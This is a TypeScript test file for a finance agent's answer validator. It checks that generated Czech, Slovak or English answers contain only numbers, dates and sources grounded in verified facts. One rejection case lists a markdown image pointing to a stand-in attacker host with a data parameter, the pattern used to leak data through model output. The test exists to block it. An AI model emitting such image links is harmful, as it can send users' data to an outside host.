// @vitest-environment node
import { describe, expect, it } from 'vitest';
import { renderVerifiedAnswer } from '../../supabase/functions/agent/core/answerTemplate.ts';
import { groundNumber, parseLocalizedDate, validateAnswer } from '../../supabase/functions/agent/core/grounding.ts';
import type { AnswerBlock, AnswerDraft, CalculationRecord, Fact } from '../../supabase/functions/agent/core/types.ts';
import { TECHNICAL } from '../test/agentLlmFixture';

const year = { from: '2026-01-01', to: '2026-12-31' };
const fact = (id: string, value: Fact['value'], over: Partial<Fact> = {}): Fact =>
  ({ id, value, unit: 'money', currency: 'USD', source: 'tax_model', as_of: '2026-10-23T12:00:00.000Z', ...over });
const loss = fact('sale:RKLB:gain', -3.35, { ticker: 'RKLB', period: year });
const price = fact('quote:RKLB:price', 21.5, { ticker: 'RKLB', source: 'Finnhub' });
const btc = fact('holding:BTC:shares', 0.00001234, { unit: 'shares', currency: undefined, ticker: 'BTC', source: 'portfolio_model' });
const czk = fact('portfolio:total_value_czk', 1234.56, { currency: 'CZK', source: 'portfolio_model' });
const earnings = fact('earnings:RKLB:next_date', '2024-10-23', { unit: 'date', currency: undefined, ticker: 'RKLB', source: 'earnings_calendar' });
const facts = new Map([loss, price, btc, czk, earnings].map(f => [f.id, f]));

const claim = (factId: string, over: Record<string, unknown> = {}) => {
  const f = facts.get(factId)!;
  return { factId, value: f.value, unit: f.unit, ...(f.currency ? { currency: f.currency } : {}), ...(f.ticker ? { ticker: f.ticker } : {}),
    ...(f.period ? { period: f.period } : {}), decimals: 2, meaning: 'value', ...over };
};
const block = (text: string, claims: Record<string, unknown> = {}, over: Partial<AnswerBlock> = {}) =>
  ({ kind: 'facts', text, claims, sourceIds: Object.values(claims).map(c => (c as { factId: string }).factId), ...over });
const draft = (...blocks: unknown[]): unknown => ({ lang: 'cs', blocks });
const ok = (d: unknown, f: ReadonlyMap<string, Fact> = facts, calcs: CalculationRecord[] = []) => validateAnswer(d, f, calcs);

describe('validateAnswer', () => {
  it('accepts a slotted claim that matches its fact in value, sign, unit, currency, ticker and period', () => {
    const result = ok(draft(block('{{c1}}', { c1: claim('sale:RKLB:gain', { meaning: 'loss' }) }, { ticker: 'RKLB' })));
    expect(result.ok).toBe(true);
  });

  it.each([
    ['a flipped sign', { value: 3.35 }],
    ['another currency', { currency: 'EUR' }],
    ['another ticker', { ticker: 'NVDA' }],
    ['another period', { period: { from: '2025-01-01', to: '2025-12-31' } }],
    ['a value outside half a unit of the stated decimals', { value: -3.36 }],
    ['an absolute value', { value: 3.35, meaning: 'gain' }],
    ['a gain label on a negative fact', { meaning: 'gain' }],
  ])('rejects %s', (_label, over) => {
    const result = ok(draft(block('{{c1}}', { c1: claim('sale:RKLB:gain', { meaning: 'loss', ...over }) })));
    expect(result.ok).toBe(false);
  });

  it('a price can never be called a gain', () => {
    expect(ok(draft(block('{{c1}}', { c1: claim('quote:RKLB:price', { meaning: 'gain' }) }))).ok).toBe(false);
    expect(ok(draft(block('{{c1}}', { c1: claim('quote:RKLB:price') }))).ok).toBe(true);
  });

  it.each([
    ['15 %', 'Portfolio vzrostlo o 15 %.'],
    ['an amount in crowns', 'Daň bude 100 000 Kč.'],
    ['a small integer', 'Máte 3 pozice.'],
    ['a number in words', 'Výnos je třicet procent.'],
    ['an English number word', 'It grew by twenty percent.'],
    ['an unslotted date', 'Výsledky budou 23 . 10. 2024.'],
    ['an internal field name', 'Hodnota time_test_exempt_czk je splněna.'],
    ['a tool name', 'Podle get_quote je cena dobrá.'],
    ['a fact ID', 'Podle quote:RKLB:price je cena dobrá.'],
    ['HTML', 'Cena je <b>dobrá</b>.'],
    ['raw JSON', 'Data: {"price": "high"}'],
    ['a markdown image', 'Graf: ![x](https://evil.example/?d=1)'],
    ['a URL', 'Více na https://example.com/a.'],
  ])('rejects unverified text: %s', (_label, text) => {
    expect(ok(draft(block(text))).ok).toBe(false);
  });

  it('rejects a currency or ticker written next to a slot instead of rendered from the fact', () => {
    expect(ok(draft(block('Cena je {{c1}} EUR.', { c1: claim('quote:RKLB:price') }))).ok).toBe(false);
    expect(ok(draft(block('Cena NVDA je {{c1}}.', { c1: claim('quote:RKLB:price') }))).ok).toBe(false);
    expect(ok(draft(block('Cena je {{c1}}.', { c1: claim('quote:RKLB:price') }, { ticker: 'NVDA' }))).ok).toBe(false);
  });

  it('keeps a tiny crypto amount from rounding to zero', () => {
    expect(ok(draft(block('{{c1}}', { c1: claim('holding:BTC:shares', { decimals: 2 }) }))).ok).toBe(false);
    expect(ok(draft(block('{{c1}}', { c1: claim('holding:BTC:shares', { decimals: 8 }) }))).ok).toBe(true);
  });

  it('checks a slotted date as a date', () => {
    const good = { factId: 'earnings:RKLB:next_date', value: '2024-10-23', unit: 'date', ticker: 'RKLB' };
    expect(ok(draft(block('{{d}}', { d: good }))).ok).toBe(true);
    expect(ok(draft(block('{{d}}', { d: { ...good, value: '2024-10-24' } }))).ok).toBe(false);
  });

  it('rejects fact IDs from another request, missing slots and calculations without their record', () => {
    expect(ok(draft(block('{{c1}}', { c1: { ...claim('quote:RKLB:price'), factId: 'quote:RKLB:price#7' } }))).ok).toBe(false);
    expect(ok(draft(block('{{c2}}', { c1: claim('quote:RKLB:price') }))).ok).toBe(false);
    const result = fact('calc:1', 43, { unit: 'money', ticker: 'RKLB', source: 'calculate' });
    const withCalc = new Map([...facts, [result.id, result]]);
    const text = draft(block('{{c1}}', { c1: { factId: 'calc:1', value: 43, unit: 'money', currency: 'USD', ticker: 'RKLB', decimals: 2, meaning: 'change' } }));
    expect(ok(text, withCalc, []).ok).toBe(false);
    const foreignInput = fact('quote:RKLB:price', 99, { ticker: 'RKLB' });
    expect(ok(text, withCalc, [{ id: 'calc:1', op: 'multiply', inputs: [foreignInput, price], result }]).ok).toBe(false);
    expect(ok(text, withCalc, [{ id: 'calc:1', op: 'multiply', inputs: [price, price], result }]).ok).toBe(true);
  });

  it('rejects a null fact, an unknown source ID and a wrong language', () => {
    const missing = fact('portfolio:net_deposits', null, { source: 'portfolio_model' });
    const withNull = new Map([...facts, [missing.id, missing]]);
    expect(ok(draft(block('{{c1}}', { c1: { factId: missing.id, value: 0, unit: 'money', currency: 'USD', decimals: 0, meaning: 'value' } })), withNull).ok).toBe(false);
    expect(ok(draft(block('', {}, { sourceIds: ['quote:XYZ:price'] }))).ok).toBe(false);
    expect(validateAnswer({ lang: 'de', blocks: [block('Ohne Zahlen.')] }, facts, []).ok).toBe(false);
  });

  it('requires the full analysis structure, a verdict and what would change it when asked to', () => {
    const blocks = ['analysts', 'valuation', 'context', 'risks', 'verdict'].map(kind => block('', {}, { kind: kind as AnswerBlock['kind'] }));
    const full = { lang: 'cs', blocks, verdict: 'fair', confidence: 'medium', wouldChange: 'evidence' };
    expect(validateAnswer(full, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(true);
    expect(validateAnswer({ ...full, blocks: blocks.slice(1) }, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(false);
    expect(validateAnswer({ ...full, verdict: undefined }, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(false);
    expect(validateAnswer({ ...full, verdict: 'attractive' }, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(false);
    expect(validateAnswer({ ...full, confidence: 'high' }, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(false);
    expect(validateAnswer({ ...full, wouldChange: '' }, facts, [], { analysis: { verdict: 'fair', maxConfidence: 'medium' } }).ok).toBe(false);
  });
});

describe('localized numbers', () => {
  it('accepts 1 234,56 Kč and 1,234.56 CZK for the same fact', () => {
    expect(groundNumber('1 234,56 Kč', czk)).toBe(true);
    expect(groundNumber('1\u00a0234,56\u00a0Kč', czk)).toBe(true);
    expect(groundNumber('1,234.56 CZK', czk)).toBe(true);
    expect(groundNumber('1 235 Kč', czk)).toBe(true);
  });
  it('keeps the sign, the currency and at most half a unit of the last stated decimal', () => {
    expect(groundNumber('1 234,57 Kč', czk)).toBe(false);
    expect(groundNumber('-1 234,56 Kč', czk)).toBe(false);
    expect(groundNumber('1 234,56 EUR', czk)).toBe(false);
    expect(groundNumber('1 240 Kč', czk)).toBe(false);
    expect(groundNumber('-3,35 USD', loss)).toBe(true);
    expect(groundNumber('3,35 USD', loss)).toBe(false);
  });
  it('reads "23 . 10. 2024" as a date, not as loose numbers', () => {
    expect(parseLocalizedDate('23 . 10. 2024')).toBe('2024-10-23');
    expect(parseLocalizedDate('10/23/2024')).toBe('2024-10-23');
    expect(parseLocalizedDate('31. 2. 2024')).toBeNull();
  });
});

describe('renderVerifiedAnswer', () => {
  it('fills numbers, currency and ticker from facts, lists human sources and never shows IDs or internal names', () => {
    const d = draft(
      block('{{c1}} {{c2}}', { c1: claim('sale:RKLB:gain', { meaning: 'loss' }), c2: claim('holding:BTC:shares', { decimals: 8 }) }),
      block('{{c3}}', { c3: claim('portfolio:total_value_czk') }),
    ) as AnswerDraft;
    expect(validateAnswer(d, facts, []).ok).toBe(true);
    const answer = renderVerifiedAnswer(d, facts);
    const text = answer.text.replace(/\u00a0|\u202f/g, ' ');
    expect(text).toContain('-3,35 USD');
    expect(text).toContain('0,00001234');
    expect(text).toContain('1 234,56 Kč');
    expect(text).toMatch(/Zdroje/);
    expect(text).not.toMatch(TECHNICAL);
    expect(answer).toMatchObject({ lang: 'cs', verified: true, outcome: 'ok' });
  });

  it('groups the sources line by source and time instead of one entry per fact', () => {
    const at = '2026-10-23T12:00:00.000Z', fetched = '2026-10-23T11:50:00.000Z';
    const own = [fact('portfolio:total_value', 3050, { source: 'portfolio_model', as_of: at }), fact('portfolio:cash', 120, { source: 'portfolio_model', as_of: at }),
      fact('holding:SYNA:value', 2000, { ticker: 'SYNA', source: 'portfolio_model', as_of: at }), fact('quote:SYNA:price', 100, { ticker: 'SYNA', source: 'price_cache', as_of: fetched }),
      fact('quote:SYNB:price', 50, { ticker: 'SYNB', source: 'price_cache', as_of: fetched })];
    const map = new Map(own.map(f => [f.id, f]));
    const slot = (f: Fact) => ({ factId: f.id, value: f.value, unit: f.unit, currency: f.currency, ...(f.ticker ? { ticker: f.ticker } : {}), decimals: 2, meaning: 'value' });
    const d = { lang: 'cs', blocks: [{ kind: 'facts', text: '{{a}} {{b}} {{c}} {{d}} {{e}}',
      claims: { a: slot(own[0]), b: slot(own[1]), c: slot(own[2]), d: slot(own[3]), e: slot(own[4]) }, sourceIds: [] }] } as unknown as AnswerDraft;
    expect(validateAnswer(d, map, []).ok).toBe(true);
    const sources = (lang: 'cs' | 'sk' | 'en') => renderVerifiedAnswer({ ...d, lang }, map).text.replace(/\u00a0|\u202f/g, ' ').split('\n').at(-1);
    expect(sources('cs')).toBe('Zdroje: Trackora – výpočet portfolia (23. 10. 2026 14:00); uložené kurzy (staženo 23. 10. 2026 13:50).');
    expect(sources('sk')).toBe('Zdroje: Trackora – výpočet portfólia (23. 10. 2026, 14:00); uložené kurzy (stiahnuté 23. 10. 2026, 13:50).');
    expect(sources('en')).toBe('Sources: Trackora – portfolio calculation (Oct 23, 2026, 2:00 PM); stored prices (retrieved Oct 23, 2026, 1:50 PM).');
  });

  it('lists several times of one source in one entry', () => {
    const a = fact('quote:SYNA:price', 100, { ticker: 'SYNA', source: 'Finnhub', as_of: '2026-10-23T12:00:00.000Z' });
    const b = fact('quote:SYNB:price', 50, { ticker: 'SYNB', source: 'Finnhub', as_of: '2026-10-22T12:00:00.000Z' });
    const map = new Map([a, b].map(f => [f.id, f]));
    const d = { lang: 'cs', blocks: [{ kind: 'facts', text: '{{a}} {{b}}', claims: {
      a: { factId: a.id, value: 100, unit: 'money', currency: 'USD', ticker: 'SYNA', decimals: 2, meaning: 'value' },
      b: { factId: b.id, value: 50, unit: 'money', currency: 'USD', ticker: 'SYNB', decimals: 2, meaning: 'value' } }, sourceIds: [] }] } as unknown as AnswerDraft;
    const line = renderVerifiedAnswer(d, map).text.replace(/\u00a0|\u202f/g, ' ').split('\n').at(-1);
    expect(line).toBe('Zdroje: Finnhub (23. 10. 2026 14:00, 22. 10. 2026 14:00).');
  });

  it('renders English with English number formats', () => {
    const d = { lang: 'en', blocks: [block('{{c1}}', { c1: claim('portfolio:total_value_czk') })] } as AnswerDraft;
    expect(validateAnswer(d, facts, []).ok).toBe(true);
    const text = renderVerifiedAnswer(d, facts).text;
    expect(text).toContain('CZK');
    expect(text).toContain('1,234.56');
    expect(text).toMatch(/Sources/);
  });
});
